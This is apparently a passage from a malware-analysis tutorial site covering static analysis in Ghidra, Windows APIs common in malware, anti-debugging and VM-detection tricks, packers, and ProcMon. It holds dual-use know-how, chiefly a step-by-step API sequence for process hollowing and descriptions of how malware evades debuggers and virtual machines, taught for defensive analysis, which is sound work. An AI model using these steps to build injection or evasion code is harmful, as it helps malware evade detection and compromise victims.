<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n    printf(\"Hello, world!\");\n    return 0;\n}\n</code></pre></p> <p>Assembly code: <pre><code>section .data \n    message db 'HELLO WORLD!!', 0\n\nsection .text\n    global _start\n\n_start:\n    ; write the message to stdout\n    mov eax, 4      ; write system call\n    mov ebx, 1      ; file descriptor for stdout\n    mov ecx, message    ; pointer to message\n    mov edx, 13     ; message length\n    int 0x80        ; call kernel\n</code></pre></p> <p>This program defines a string \"HELLO WORLD!!\" in the .data section and then uses the <code>write system call</code> to <code>print the string to stdout</code>.</p> <p></p> <p>If we look at the disassembled code in the Listings View, we can see instructions to push HELLO WORLD!! to the stack before calling the print function.</p>"},{"location":"Reverse_Engineering/Advanced_static/#for-loop-example","title":"For loop example","text":"<pre><code>int main()\n{\n    for (int i = 1; i &lt;= 5; i++)\n    {\n        std::cout &lt;&lt; i &lt;&lt; std::endl;\n    }\n    return 0;\n}\n</code></pre> <pre><code>main:\n    ; initialize loop counter to 1\n    mov ecx, 1\n\n    ; loop 5 times\n    mov edx, 5\nloop:\n    ; print the loop counter\n    push ecx\n    push format\n    call printf\n    add esp, 8\n\n    ; increment loop counter\n    inc ecx\n\n    ; check if the loop is finished\n    cmp ecx, edx\n    jle loop\n</code></pre>"},{"location":"Reverse_Engineering/Advanced_static/#function-example","title":"Function example","text":"<pre><code>int add(int a, int b)\n{\n    int result = a + b;\n    return result;\n}\n</code></pre> <pre><code>add:\n    push ebp          ; save the current base pointer value\n    mov ebp, esp      ; set base pointer to current stack pointer value\n    mov eax, dword ptr [ebp+8]  ; move the value of 'a' into the eax register\n    add eax, dword ptr [ebp+12] ; add the value of 'b' to the eax register\n    mov dword ptr [ebp-4], eax  ; move the sum into the 'result' variable\n    mov eax, dword ptr [ebp-4]  ; move the value of 'result' into the eax register\n    pop ebp           ; restore the previous base pointer value\n    ret               ; return to calling function\n</code></pre> <p>The add function starts by saving the current base pointer value onto the stack. Then, it sets the base pointer to the current stack pointer value. The function then moves the values of a and b into the eax register, adds them, and store the result in the result variable. Finally, the function moves the value of the result into the eax register, restores the previous base pointer value, and returns to the calling function.</p>"},{"location":"Reverse_Engineering/Advanced_static/#an-overview-of-api-calls","title":"An overview of API calls","text":"<p>The Windows API is a <code>collection of functions and services</code> the Windows Operating System provides to <code>enable developers to create Windows applications</code>. These functions include <code>creating windows</code>, <code>menus</code>, <code>buttons</code>, and <code>other user-interface elements</code> and <code>performing tasks</code> such as file input/output and network communication.</p>"},{"location":"Reverse_Engineering/Advanced_static/#createprocessa-example","title":"CreateProcessA example","text":"<p>The <code>CreateProcessA</code> function creates a new process and its primary thread. The function takes several parameters, including the name of the executable file, command-line arguments, and security attributes.</p> <p></p> <p>Here is an example of C code that uses the CreateProcessA function to launch a new process:</p> <pre><code>#include &lt;windows.h&gt;\n\nint main()\n{\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n\n    ZeroMemory(&amp;si, sizeof(si));\n    si.cb = sizeof(si);\n    ZeroMemory(&amp;pi, sizeof(pi));\n\n    if (!CreateProcess(NULL, \"C:\\\\\\\\Windows\\\\\\\\notepad.exe\", NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi))\n    {\n        printf(\"CreateProcess failed (%d).\\\\n\", GetLastError());\n        return 1;\n    }\n\n    WaitForSingleObject(pi.hProcess, INFINITE);\n\n    CloseHandle(pi.hProcess);\n    CloseHandle(pi.hThread);\n\n    return 0;\n}\n</code></pre> <p>When compiled into assembly code, the CreateProcessA function call looks like this: <pre><code>push 0\nlea eax, [esp+10h+StartupInfo]\npush eax\nlea eax, [esp+14h+ProcessInformation]\npush eax\npush 0\npush 0\npush 0\npush 0\npush 0\npush 0\npush dword ptr [hWnd]\ncall CreateProcessA\n</code></pre></p> <p>This assembly code <code>pushes the necessary parameters onto the stack in reverse order</code> and then calls the CreateProcessA function. The CreateProcessA function then launches a new process and returns a handle to the process and its primary thread.</p> <p>During malware analysis, identifying the API call and examining the code can help understand the malware's purpose.</p>"},{"location":"Reverse_Engineering/Advanced_static/#common-apis-used-by-malware","title":"Common APIs used by Malware","text":"<p>Malware authors heavily rely on Windows APIs to accomplish their goals. It's important to know the Windows APIs used in different malware variants. It's an important step in advanced static analysis to examine the <code>import</code> functions, which can reveal much about the malware.</p>"},{"location":"Reverse_Engineering/Advanced_static/#keylogger","title":"Keylogger","text":"<ul> <li><code>SetWindowsHookEx</code>: Installs an <code>application-defined hook procedure into a hook chain</code>. Used to <code>monitor and intercept system events</code>, such as <code>keystrokes</code> or <code>mouse clicks</code>.</li> <li><code>GetAsyncKeyState</code>: Retrieves the status of a virtual key when the function is called. Used to <code>determine if a key is being pressed</code> or <code>released</code>.</li> <li><code>GetKeyboardState</code>: Retrieves the status of all virtual keys. Used to <code>determine the status of all key</code>s on the keyboard.</li> <li><code>GetKeyNameText</code>: Retrieves the <code>name of a key</code>. Used to <code>determine the name of the pressed key</code>.</li> </ul>"},{"location":"Reverse_Engineering/Advanced_static/#downloader","title":"Downloader","text":"<p>Designed to download other malware onto a victim's system.</p> <ul> <li><code>URLDownloadToFile</code>: <code>Downloads a file</code> from the internet and saves it to a local file. Used to <code>download additional malicious code</code> or updates to the malware.</li> <li><code>WinHttpOpen</code>: <code>Initializes the WinHTTP API</code>. Used to <code>establish an HTTP connection to a remote server</code> and download additional malicious code.</li> <li><code>WinHttpConnect</code>: <code>Establishes a connection</code> to a remote server using the WinHTTP API. Used to <code>connect to a remote server and download additional malicious code</code>.</li> <li><code>WinHttpOpenRequest</code>: <code>Opens HTTP request</code> using the WinHTTP API. Used to <code>send HTTP requests to a remote server</code> and download additional malicious code or steal data.</li> </ul>"},{"location":"Reverse_Engineering/Advanced_static/#c2-communication","title":"C2 Communication","text":"<p>Command and Control (C2) communication is a method malware uses to communicate with a remote server or attacker.</p> <ul> <li><code>InternetOpen</code>: <code>Initializes a session for connecting to the internet</code>. Used to <code>connect to a remote server and communicate with a command-and-control (C2) server</code>.</li> <li><code>InternetOpenUrl</code>:<code>Opens a URL</code> for download. Used to <code>download additional malicious code</code> or steal data from a C2 server.</li> <li><code>HttpOpenRequest</code>: <code>Opens HTTP request</code>. Used to <code>send HTTP requests to a C2 server and receive commands</code> or additional malicious code.</li> <li><code>HttpSendRequest</code>: Sends <code>HTTP request to a C2 server</code>. Used to <code>send data or receive commands</code> from a C2 server.</li> </ul>"},{"location":"Reverse_Engineering/Advanced_static/#data-exfiltration","title":"Data Exfiltration","text":"<p>Unauthorized data transfer from an organization to an external destination.</p> <ul> <li><code>InternetReadFile</code>: <code>Reads data from a handle to an open internet resource</code>. Used to <code>steal data from a compromised system and transmit it to a C2 server</code>.</li> <li><code>FtpPutFile</code>: <code>Uploads a file to an FTP server</code>. Used to <code>exfiltrate stolen data to a remote server</code>.</li> <li><code>CreateFile</code>: <code>Creates or opens a file or device</code>. Used to <code>read or modify files containing sensitive information</code> or <code>system configuration data</code>.</li> <li><code>WriteFile</code>: <code>Writes data to a file or device</code>. Used to <code>write stolen data to a file and then exfiltrate it</code> to a remote server.</li> <li><code>GetClipboardData</code>: Used to <code>retrieve data from the clipboard</code>. Used to <code>retrieve sensitive data that is copied to the clipboard</code>.</li> </ul>"},{"location":"Reverse_Engineering/Advanced_static/#dropper","title":"Dropper","text":"<p>Designed to install other malware onto a victim's system.</p> <ul> <li><code>CreateProcess</code>: <code>Creates a new process and its primary thread</code>. Used to <code>execute its code in the context of a legitimate process</code>, making it more difficult to detect and analyze.</li> <li><code>VirtualAlloc</code>: Reserves or commits a region of memory within the virtual address space of the calling process. Malware can use this function to <code>allocate memory to store its code</code>.</li> <li><code>WriteProcessMemory</code>: Writes data to an area of memory within the address space of a specified process. Used to <code>write its code to the allocated memory</code>.</li> </ul>"},{"location":"Reverse_Engineering/Advanced_static/#api-hooking","title":"API Hooking","text":"<p><code>Intercept calls to Windows APIs and modify their behavior</code>.</p> <ul> <li><code>GetProcAddress</code>: <code>Retrieves the address of an exported function or variable</code> from a specified dynamic-link library (DLL). Used to <code>locate and hook API calls made by other processes</code>.</li> <li><code>LoadLibrary</code>: Loads a dynamic-link library (DLL) into a process's address space. Used to <code>load and execute additional code from a DLL or other module</code>.</li> <li><code>SetWindowsHookEx</code> This API is used to <code>install a hook procedure that monitors messages sent to a window or system event</code>. Used to <code>intercept calls to other Windows APIs and modify their behavior</code>.</li> </ul>"},{"location":"Reverse_Engineering/Advanced_static/#anti-debugging-and-vm-detection","title":"Anti-debugging and VM detection","text":"<p>Evade detection and analysis by security researchers.</p> <ul> <li><code>IsDebuggerPresent</code>: Checks whether a process is running under a debugger. Used to <code>determine whether it is being analyzed</code> and take appropriate action to evade detection.</li> <li><code>CheckRemoteDebuggerPresent</code>: Checks whether a remote debugger is debugging a process. Used to <code>determine whether it is being analyzed</code> and take appropriate action to evade detection.</li> <li><code>NtQueryInformationProcess</code>: Retrieves information about a specified process. Used to <code>determine whether the process is being debugged</code> and take appropriate action to evade detection.</li> <li><code>GetTickCount</code>: Retrieves the number of milliseconds that have elapsed since the system was started. Used to <code>determine whether it is running in a virtualized environment</code>, which may indicate that it is being analyzed.</li> <li><code>GetModuleHandle</code>: Retrieves a handle to a specified module. Used to <code>determine whether it is running under a virtualized environment</code>, which may indicate that it is being analyzed.</li> <li><code>GetSystemMetrics</code>: Retrieves various system metrics and configuration settings. Used to <code>determine whether it is running under a virtualized environment</code>, which may indicate that it is being analyzed.</li> </ul> <p>Read more on malapi.io to learn about APIs used in different malware families.</p>"},{"location":"Reverse_Engineering/Advanced_static/#analyzing-process-hollowing","title":"Analyzing process hollowing","text":"<p>Let's take analyze a code sample that uses process hollowing.</p> <p>An important point to note is that almost all malware comes <code>packed with known or custom packers</code> and also have employed different Anti-debugging / VM detection techniques to hinder the analysis. </p> <p>This sample is not packed and has no Anti-debugging / VM detection techniques is applied.</p> <p>Our objective of advanced static analysis would be to: - <code>Examine the API calls</code> to find a pattern or suspicious call. - Look at the suspicious <code>strings</code>. - Find <code>interesting or malicious functions</code>. - Examine the disassembled/decompiled code to <code>find as much information as possible</code>.</p> <p>Warning</p> <p>It's important to mention that starting to search for the CreateProcessA function right away is not how an analyst would start analyzing an unknown binary. This whole example is just to get comfertable with Ghidra.</p>"},{"location":"Reverse_Engineering/Advanced_static/#createprocess","title":"CreateProcess","text":"<p>The suspicious process creates a victim process in the suspended state.</p> <p>To confirm, let's search for the CreateProcessA API in the Symbol Tree section.</p> <p>Then, <code>right-click on the Show References</code> to option to display all the program sections where this function is called.</p> <p>Clicking on the first reference will take us to the disassembled code and show the decompiled C code in the Decompile section.</p> <p>It clearly shows how the parameters on the stack are being pushed in reverse order before calling the function. The value <code>0x4</code> in the <code>process creation flag</code> is being pushed into the stack, representing the <code>suspended state</code>.</p>"},{"location":"Reverse_Engineering/Advanced_static/#graph-view","title":"Graph View","text":"<p>Clicking on the Display Function Graph in the toolbar will show the graph view of the disassembled code we are examining.</p> <p></p> <p>In the above case, if the program:</p> <ul> <li>Fails to create a victim process in the suspended state, it will move to block 1. The <code>red arrow represents the failure</code> to meet the condition mentioned above.</li> <li>Successfully creates the victim process, it will move to block 2. The <code>green arrow represents the success</code> of the jump condition.</li> </ul>"},{"location":"Reverse_Engineering/Advanced_static/#example-of-further-analysis","title":"Example of further analysis","text":"<ol> <li> <p>Opening a suspicous file</p> <p>The CreateFileA API is used to either create or open an existing file.</p> </li> <li> <p>Hollowing the process</p> <p>Malware use ZwUnmapViewOfSection or NtUnmapViewOfSection API calls to unmap the target process's memory.</p> <p>NtUnmapViewOfSection takes exactly two arguments, the base address (virtual address) to be unmapped and the handle to the process that needs to be hollowed.</p> </li> <li> <p>Allocating memory</p> <p>Once the process is hollowed, malware must allocate the memory using VirtualAllocEx before writing the process.</p> <p>Arguments passed to the function include a handle to the process, address to be allocated, size, allocation type, and memory protection flag.</p> </li> <li> <p>Writing down the memory</p> <p>Once the memory is allocated, the malware will attempt to write the suspicious process/code into the memory of the hollowed process. The WriteProcessMemory API is used for this purpose.</p> <p>There were three calls to the WriteProcessMemory Function. The last call references to the code in the Kernel32 DLL; therefore, we can ignore that. From the decompiled code, it seems the program is copying different sections of the suspicious process one by one.</p> </li> <li> <p>Resuming the thread</p> <p>Once all is sorted out, the malware will get hold of the thread using the SetThreadContext and then resume the thread using the ResumeThread API to execute the code.</p> </li> </ol>"},{"location":"Reverse_Engineering/Anti_reversing/","title":"Anti-reverse engineering","text":"<p>Malware authors are constantly looking for ways to evade detection and analysis to maintain the effectiveness of their malware. At the same time, security professionals are working to develop new methods and tools for detecting and mitigating the threat posed by malware. This ongoing \"arms race\" can lead to the development of increasingly sophisticated and effective malware defences as both sides seek to stay ahead of their counterparts.</p> <p>Reverse engineering is the process of studying a technology product, software, or hardware to learn how it works and extract its functionality or design information. In cybersecurity, reverse engineering is used to understand how malware works, extract indicators of compromise (IOCs), and develop adequate detections, protections, and countermeasures.</p> <p>As a response, malware authors are motivated to protect their malware from analysts. They use anti-reverse engineering techniques to make malware more challenging to analyze, so it can continue propagating and infecting more systems before security measures are implemented.</p> <p>This constant back and forth between malware analysts and authors can be aptly described as an \"<code>arms race</code>\". Malware authors develop new and sophisticated techniques to avoid detection and analysis, and security professionals respond by developing new methods and tools to detect and mitigate the threat posed by malware. As each side grows new techniques, the other responds with even more advanced ones, creating a cycle of escalation.</p> <p>We will explore some of the various anti-reverse engineering techniques malware uses. These include:</p> <ul> <li><code>VM Detection</code></li> <li><code>Obfuscation using Packers</code></li> <li><code>Anti-Debugging</code></li> </ul> <p>Many more techniques exist, but we will focus on these three for this room.</p>"},{"location":"Reverse_Engineering/Anti_reversing/#anti-debugging","title":"Anti-debugging","text":"<p>Debugging is the process of examining software to understand its inner workings and identify potential vulnerabilities or issues. Debugging involves software tools called <code>debuggers</code> that allow analysts to <code>step through the code and monitor its execution</code>. </p> <p>Here are the commonly used debuggers for malware analysis nowadays:</p> <ul> <li>x64dbg</li> <li>Ollydbg</li> <li>Ida Pro</li> <li>Ghidra</li> </ul>"},{"location":"Reverse_Engineering/Anti_reversing/#anti-debugging-techniques","title":"Anti-Debugging techniques","text":"<p>Some of the most common anti-debugging measures include, but are not limited to: - <code>Checking for the presence of debuggers</code>:</p> <pre><code>Malware code looks for processes or files associated with debugging tools or hardware-based techniques, such as detecting hardware breakpoints. For example, a common anti-debugging technique uses the Windows API function `IsDebuggerPresent` to check if a debugger is running.\n</code></pre> <ul> <li> <p><code>Tampering with debug registers</code>:</p> <p>Malware may try to modify or corrupt debug logs, which debuggers use to control the execution of code. This prevents the debugger from functioning correctly.</p> </li> <li> <p><code>Using self-modifying code</code>:</p> <p>This is a sophisticated technique where malware modifies itself while running, making it difficult for a debugger to follow the code flow.</p> </li> </ul>"},{"location":"Reverse_Engineering/Anti_reversing/#suspend-thread","title":"Suspend Thread","text":"<p>Suspend thread is a Windows API function that is used to <code>pause the execution of a thread in a running process</code>. This function has legitimate uses but can also be <code>called from within a malware process to suspend any threads attempting to debug or analyze it</code>. In turn, making the debugger not work.</p> <p>Take a look at this proof of concept.</p> <p>If you don't want to be bothered with reading the source code, here is a short explanation of the steps used by this technique:</p> <ol> <li>The malware <code>goes through all</code> threads in the Windows system.</li> <li><code>For each</code> thread, it calls <code>EnumWindow</code> to go through each window displayed on the screen.</li> <li><code>If the name</code> of the window <code>has the strings debugger</code>, <code>dbg</code>, or <code>debug</code>, then the malware knows that a debugger is running.</li> <li><code>If</code> a <code>debugger is present</code>, the malware calls <code>SuspendThread</code>, which suspends the threads of the debugger, <code>making it crash</code>.</li> </ol>"},{"location":"Reverse_Engineering/Anti_reversing/#patching","title":"Patching","text":"<p>Patching is one of the most critical skills required of an analyst. In cases like this we want to patch the function SuspendThread so that our debugger won't get suspended.</p> <p>A good way to patch this would be to go to the <code>entry point</code> and search the <code>current module</code> for <code>intermodular calls</code> (the SuspendThread call). Once we've found it we just fill the function call with <code>NOP</code> instructions and resume execution.</p> <p>Warning</p> <p>However,  if you try debugging again, you'll discover it will start crashing again. This is because our patches are reset and are now gone. To avoid re-applying patches in the future, we can export and import our patches for future use.</p>"},{"location":"Reverse_Engineering/Anti_reversing/#vm-detection","title":"VM Detection","text":"<p>Virtual Machines (VMs) are software platforms that simulate a computer environment inside another computer system. These are useful in reverse engineering because they provide a <code>cost-effective</code>, <code>controlled</code>, and <code>isolated environment</code> for monitoring and analyzing suspicious software or malware. VMs also allow for the creation of snapshots and checkpoints that can be used to restore the system to a previous state, which helps test different scenarios and maintain a history of the analysis process.</p> <p>When malware identifies that it is running on a VM, it may decide to respond differently; for example, it may change its behaviour by:</p> <ul> <li>Executing only a <code>minimal subset of its functionality</code></li> <li><code>Self-destructing</code> by deleting itself or overwriting parts of its code</li> <li><code>Cause damage</code> to the system by deleting or encrypting files; or</li> <li><code>Not run at all</code></li> </ul>"},{"location":"Reverse_Engineering/Anti_reversing/#vm-detection-techniques","title":"VM Detection Techniques","text":"<ul> <li> <p><code>Checking running processes</code>:</p> <p>VMs have easily identifiable processes; for example, VMWare runs a process called vmtools, while VirtualBox has vboxservice. Malware can use the EnumProcess Windows API to list all the processes running on the machine and look for the presence of these tools.</p> </li> <li> <p><code>Checking installed software</code>:</p> <p>Malware can look in the Windows Registry for a list of installed software under the SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall Registry key. From here, it can check for installed programs like debuggers, decompilers, forensics tools, etc.</p> </li> <li> <p><code>Network fingerprinting</code>:</p> <p>Malware can look for specific MAC and network addresses unique to VMs. For example, VMs autogenerate MAC addresses that start with any of the following numbers: 00-05-69, 00-0c-29, 00-1c-14 or 00-50-56. These numbers are unique and are specifically assigned to a VM vendor called the OUI (Organizationally Unique Identifier).</p> </li> <li> <p><code>Checking machine resources</code>:</p> <p>Malware can look at a machine's resources like RAM and CPU Utilization percentages. For example, a machine with RAM amounting to less than 8GB can indicate a virtual machine, as they are typically not assigned a significant amount.</p> </li> <li> <p><code>Detecting peripherals</code>:</p> <p>Some malware checks for connected printers because this is rarely configured properly on VMs, sometimes not even configured at all.</p> </li> <li> <p><code>Checking for domain membership</code>:</p> <p>Corporate networks are a usual target for malware. An easy way to determine this is by checking if the current machine is part of an Active Directory domain. This can quickly be done without the use of API calls by checking the LoggonServer and ComputerName environment variables.</p> </li> <li> <p><code>Timing-based attacks</code>:</p> <p>Malware can measure the time it takes to execute specific instructions or access particular machine resources. For example, some instructions can be faster on a physical machine compared to a virtual machine.</p> </li> <li> <p><code>Checking temperature</code>:</p> <p><code>Win32_TemperatureProbe</code> is a <code>Windows Management Instrumentation (WMI)</code> class that contains real-time temperature readings from the hardware through the <code>SMBIOS (System Management BIOS)</code> data structure. In a virtualized environment, the value returned is Not Supported, which is what malware looks for.</p> <p>Note: <code>Win32_TemperatureProbe</code> may also return Not Supported even on physical machines if the hardware doesn't support this SMBIOS feature. This makes it unreliable but valuable when used with the other techniques.</p> </li> </ul>"},{"location":"Reverse_Engineering/Anti_reversing/#anti-vm-detection","title":"Anti-VM Detection","text":"<p>To prevent malware from using some of the techniques above, we can apply several changes to the system that will remove VM-related artefacts making the VM look less like a VM. For example, we can remove or modify the Registry entries that malware checks for installed programs to hide our debuggers, change the MAC addresses, or configure the VM to appear connected to a printer.</p> <p>But you can see how tedious this becomes. With the myriad of options available to malware, it would be challenging to cover all of them.</p> <p>Some researchers have made scripts  (See <code>VMwareCloak</code> and <code>VBoxCloak</code>) to help automate this process. Despite this, even if all the known techniques are addressed, minor architectural checks can still be made by malware, as you will see in the next task.</p> <p>Architectural checks like checking the temperature can be challenging to prevent. However, there are still ways around this. We can patch a function with nops to prevent it from executing. We can do the same thing here, but for the sake of giving you more tools to help you with reverse engineering, there's two other approaches: - Manipulating memory directly - Changing the execution flow with EIP</p>"},{"location":"Reverse_Engineering/Anti_reversing/#packersoverview","title":"Packers(Overview)","text":"<p>Obfuscation is a technique that aims to intentionally obscure data and code so that it is harder to understand or analyze. </p> <p>The most common obfuscation techniques used by malware authors include: - <code>Using encoding techniques</code>:</p> <pre><code>This involves `encoding data` (i.e. command line strings, domain names, etc.) using popular encoding techniques like XOR or Base64. You may have seen a Base64 encoded strings that look like this VGhpcyBpcyBhbiBCQVNFNjQgZW5jb2RlZCBzdHJpbmcu==.\n</code></pre> <ul> <li> <p><code>Using encryption techniques</code>:</p> <p>This involves encrypting data such as communications to a command and control server, file formats, and network traffic. The most common types used are <code>symmetric key and public key encryption</code>.</p> </li> <li> <p><code>Code obfuscation</code>:</p> <p>This involves various techniques such as manipulating the code to <code>alter its syntax and structure</code>, <code>renaming functions</code>, or <code>splitting code across multiple files or code segments</code>.</p> </li> </ul>"},{"location":"Reverse_Engineering/Anti_reversing/#packers","title":"Packers","text":"<p>Packers are tools that <code>compress and encrypt executable files</code>. It compresses the target executable <code>and embeds it within a new executable file</code> that serves as a wrapper or container. This dramatically reduces the size of the file, making it ideal for easy distribution and installation. Also, some packers offer additional features, such as code obfuscation, runtime packing, and anti-debugging techniques. And it is because of these features that made Packers a popular tool for malware authors.</p> <p>There are a lot of Packers available. Each has a unique approach and algorithm for packing. Here is a list of some that were seen used in the wild:</p> <ul> <li>Alternate EXE Packer</li> <li>ASPack</li> <li>ExeStealth</li> <li>hXOR-Packer</li> <li>Milfuscator</li> <li>MPress</li> <li>PELock</li> <li>Themida</li> <li>UPX: the Ultimate Packer for eXecutables</li> <li>VMProtect</li> </ul> <p>It is essential to state that not all packed programs are malicious. Packers are also used by legitimate software to protect their programs, like for protecting their intellectual property from theft. For example, the Packer tool \"Themida\" is widely used to prevent video game cheating.</p> <p>Because Packers encrypts and obfuscates a program, it would be impossible to know the malware's capabilities without running it. Because of this, we cannot reliably depend on static analysis and signature-based detection techniques to determine its capabilities. The only information we could glean from a malware sample at this state is the Packer tool used. This can still be a good starting point for an investigation, which we will see in the next task.</p>"},{"location":"Reverse_Engineering/Anti_reversing/#identifying-and-unpacking","title":"Identifying and Unpacking","text":"<p>The first step in dealing with packed programs is identifying the Packer used. Thankfully, there are tools that we can use for this. The most accessible tools are DetectItEasy (DIE) and PEStudio, which are already included in the VM attached to this room.</p> <p>Entropy measures the level of disorder or uncertainty in a system. Packed malware tends to have high entropy due to the randomness of the packing process.</p> <p>Another tool is <code>PEStudio</code> which lists information on PE files. This is important because there are specific Packers that will still leave clues.</p> <p>Usually, the section names of a standard PE file are .text, .data and .rsrc. The strings <code>UPX0</code>, <code>UPX1</code>, and <code>UPX2</code> are one of those identifiable pieces of information that Packers like UPX leave behind. Not all Packers change this value, but usually, this is the most accessible first place to look.</p> <p>Because different Packer tools use various methodologies in packing executables, sometimes tools like DetectItEasy could not identify all types of Packers.</p>"},{"location":"Reverse_Engineering/Anti_reversing/#automated-unpacking","title":"Automated unpacking","text":"<p>Once the Packer for a packed malware is identified, it is possible to use an <code>unpacker</code> to get back the original file. Some are readily available, like in the case of UPX, where you can use the same packing program for unpacking. For other commercial tools like Themida, you may have to rely on <code>unpacker scripts</code> made by 3<sup>rd</sup> parties.</p> <p>Here is a short list of scripts that you could use for specific Unpacker tools: - Themida - Enigma Protector - Mpress unpacker</p> <p>If you chance upon malware packed with an obscure tool or modified to thwart available scripts, things might be more difficult.</p> <p>Thankfully, there are services like <code>unpac.me</code> where you can upload a sample. It will try to identify and unpack the malware for you using <code>custom unpacking and artefact extraction</code> processes. While this service is excellent, it can still fail.</p>"},{"location":"Reverse_Engineering/Anti_reversing/#manual-unpacking-and-dumping","title":"Manual Unpacking and Dumping","text":"<p>Ultimately, the <code>best way to unpack malware is to execute it</code>.</p> <p>When a packed malware is executed, the wrapper or container code performs decryption and deobfuscation. Once fully unpacked, the malware can proceed with its true intentions. At this point, the Packer is useless, and we can thoroughly analyze the malware by debugging it while it's in memory using a debugger.</p> <p>We can also dump this unpacked version as a separate executable. </p>"},{"location":"Reverse_Engineering/Anti_reversing/#process-hollowing-overview","title":"Process Hollowing: Overview","text":"<p>A process injection technique, mostly used to evade detection. Another technique used by malware to hide in plain sight is Process Hollowing. In this technique, the malware binary hollows an already running legitimate process by removing all its code from its memory and injecting malicious code in place of the legitimate code. </p> <p>Used to inject malicious code into a legitimate process running on a victim's computer.</p> <p>The malware <code>creates a suspended process and replaces its memory space with its own code</code>. Then it <code>resumes the process</code>, causing it to execute the injected code.</p> <ol> <li>Create a new process using the <code>CreateProcessA()</code> API. This <code>process will act as a legitimate process</code> and will be hollowed out.</li> <li><code>NtSuspendProcess()</code> is then used to <code>suspend the new process</code>.</li> <li><code>Allocate memory</code> in the suspended process using the <code>VirtualAllocEx()</code> API. This memory will be used to hold the malicious code.</li> <li>Write the malicious <code>code to the allocated memory</code> using the <code>WriteProcessMemory()</code> API.</li> <li><code>Modify the entry point of the process to point to the address of the malicious code</code> using the <code>SetThreadContext()</code> and <code>GetThreadContext()</code> APIs.</li> <li>Resume the suspended process using the <code>NtResumeProcess()</code> API. This will cause the process to <code>execute the malicious code</code>.</li> </ol> <p>This allows the malware to <code>bypass security measures</code> that may be in place, as the malicious code is executed within the context of a legitimate process.</p> <p>Process hollowing proof of concept</p>"},{"location":"Reverse_Engineering/Anti_reversing/#process-masquerading-overview","title":"Process Masquerading: Overview","text":"<p>As seen in the above screenshot, the properties function shows us a lot of information about a process in its different tabs. Malware authors sometimes use process names similar to Windows processes or commonly used software to hide from an analyst's prying eyes. The 'Image' tab, as shown in the above screenshot, helps an analyst defeat this technique. By clicking the 'Verify' button on this tab, an analyst can identify if the executable for the running process is signed by the relevant organization, which will be Microsoft in the case of Windows binaries. In this particular screenshot, we can see that the Verify option has already been clicked. Furthermore, we can see the text '(No signature was present in the subject) Microsoft Corporation' at the top. This means that although the executable claims to be from Microsoft, it is not digitally signed by Microsoft and is masquerading as a Microsoft process. This can be an indication of a malicious process.</p> <p>We must note here that this verification process only applies to the Image of the process stored on the disk. If a signed process has been hollowed and its code has been replaced with malicious code in the memory, we might still get a verified signature for that process. To identify hollowed processes, we have to look somewhere else.</p>"},{"location":"Reverse_Engineering/Basic_dynamic/","title":"Basic Dynamic analysis","text":"<p>As we have learned, malware can use techniques to hide its features from a malware analyst. But no matter how good malware hides its features from static analysis, its primary purpose is to execute. And <code>when malware executes, it leaves traces</code> that a malware analyst can use to identify if it's malicious. </p>"},{"location":"Reverse_Engineering/Basic_dynamic/#sandboxing","title":"Sandboxing","text":"<p>It has been emphasized that malware should only be analyzed in a controlled environment, ideally a virtual machine. However, this becomes increasingly important for the dynamic analysis of malware.</p> <p>The primary concern regarding performing static analysis on malware in a live environment is an accidental execution, but we intentionally execute malware in a dynamic analysis scenario.</p> <p>In the Intro to Malware Analysis, we learned about some automated sandboxes to help perform dynamic analysis. Below, we will learn about some tools to help create our sandbox, which gives us more analysis control.</p>"},{"location":"Reverse_Engineering/Basic_dynamic/#virtualization","title":"Virtualization","text":"<p>A lot of commercial and free tools are available for virtualization:</p> <ul> <li>Oracle's VirtualBox</li> <li>VMware's Player and Workstation</li> </ul> <p>These three tools allow us to create Virtual Machines isolated from our local machine. </p> <p>Warning</p> <p>However, <code>VMWare Player can't create snapshots</code>.</p> <p>For dynamic analysis of malware, <code>snapshot creation is a critical requirement</code>, which makes VMWare Player unsuitable for malware analysis. VMWare Workstation and VirtualBox have the snapshot creation option and are, therefore, suitable for malware analysis.</p> <p>Apart from these, <code>server-based virtualization software</code> like <code>XenServer</code>, <code>QEmu</code>, <code>ESXi</code>, etc., help with virtualization on a dedicated server. This type of setup is often used by enterprises for their virtualization needs. Security research organizations often use similar technologies to create a VM farm for large-scale virtualization.</p>"},{"location":"Reverse_Engineering/Basic_dynamic/#procmon","title":"ProcMon","text":"<p>ProcMon is part of the <code>Sysinternals suite</code>, a set of utilities created by a company named Winternals Software and purchased by Microsoft in 2006. Sysinternals consists of many handy utilities that provide advanced functionalities for Windows.</p> <p></p> <p>The controls of ProcMon are self-explanatory, and a brief description is shown if we hover over one of the controls. The labels in the screenshot show some of the critical controls of the data visible below these controls.</p> <ol> <li>Shows the Open and Save options. These options are for opening a file that contains ProcMon events or saving the events to a supported file.</li> <li>Shows the Clear option. This option clears all the events currently being shown by ProcMon. It is good to clear the events once we execute a malware sample of interest to reduce noise.</li> <li>Shows the Filter option, which gives us further control over the events shown in the ProcMon window.</li> <li>These are toggles to turn off or on Registry, FileSystem, Network, Process/Thread, and Profiling events.</li> </ol> <p>Below these controls, we can see from left to right the Time, Process, Process ID (PID), Event Name, Path, Result and Details of the activity. We can observe that events are shown in chronological order. Generally, ProcMon will show an overwhelming number of events occurring on the system. For ease of analysis, it is <code>wise to filter the events to those of our interest</code>.</p>"},{"location":"Reverse_Engineering/Basic_dynamic/#filtering-events","title":"Filtering events","text":"<p>If we right-click on the process column on the process of our choice, a pop-up menu opens up. We can see different options in the pop-up menu. Some of these options are related to filtering. For example, if we choose the option Include 'Explorer.EXE', ProcMon will only show events with Process Name Explorer.EXE. If we choose the option Exclude 'Explorer.EXE', it will exclude Explorer.EXE from the results. Similarly, we can right-click on other columns of the events window to filter other options.</p> <p>Also, when we right-click on an event, we can filter in/out an event. Similarly, we can add more filters to the results until we narrow down the results to the events of our interest. If we choose the Include 'Explorer.EXE' and Include 'CreateFile' events, ProcMon will only show us CreateFile events triggered by Explorer.EXE.</p>"},{"location":"Reverse_Engineering/Basic_dynamic/#advanced-filtering","title":"Advanced filtering","text":"<p>ProcMon also allows us to implement advanced filters. In the menu marked as number 3 in the image above, we can see the option for filtering. When we click on this option, we see a window pop up.</p> <p>We can see some preset filters already applied in ProcMon, like the one for filtering out Procmon.exe. We can see that the filter process is quite simple to implement. We select filtering values, like Process Name, its relation, value, and action. If the checkbox is ticked, the filter is applied. Otherwise, the filter is 